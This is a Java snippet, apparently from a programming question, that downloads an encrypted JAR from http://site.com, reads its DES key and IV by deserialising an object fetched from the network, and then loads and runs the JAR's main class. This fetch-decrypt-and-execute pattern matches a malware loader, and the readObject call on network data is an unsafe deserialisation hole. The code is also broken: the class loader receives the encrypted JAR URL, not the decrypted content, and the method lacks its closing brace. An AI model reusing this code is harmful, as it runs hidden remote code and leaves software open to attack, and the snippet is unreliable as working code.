public static void main(String args[]) throws Exception {

String jar = "http://site.com/api/rsc/test.jar";
List<URL> urls = new ArrayList<URL>();
urls.add(getURL(jar));
URL jarurl = urls.get(0);

ObjectInputStream ois = new ObjectInputStream((new URL("http://site.com/api/rsc/key_1.txt").openStream()));
Object o = ois.readObject();
DESKeySpec ks = new DESKeySpec((byte[])o);
SecretKeyFactory skf = SecretKeyFactory.getInstance("DES");
SecretKey key = skf.generateSecret(ks);

Cipher c = Cipher.getInstance("DES/CFB8/NoPadding");
c.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec((byte[]) ois.readObject()));
CipherInputStream cis = new CipherInputStream((jarurl.openStream()), c);

JarInputStream jis = new JarInputStream(cis);
String main = jis.getManifest().getMainAttributes().getValue("Main-Class");
String classpaths[] = jis.getManifest().getMainAttributes().getValue("Class-Path").split(" ");

for (String classpath: classpaths) {
    urls.add(getURL(classpath));
}

URLClassLoader loader = new URLClassLoader(urls.toArray(new URL[0]));
Class<?> cls = loader.loadClass(main);
Thread.currentThread().setContextClassLoader(loader);
Method m = cls.getMethod("main", new Class[]{new String[0].getClass()});
m.invoke(null, new Object[]{args});
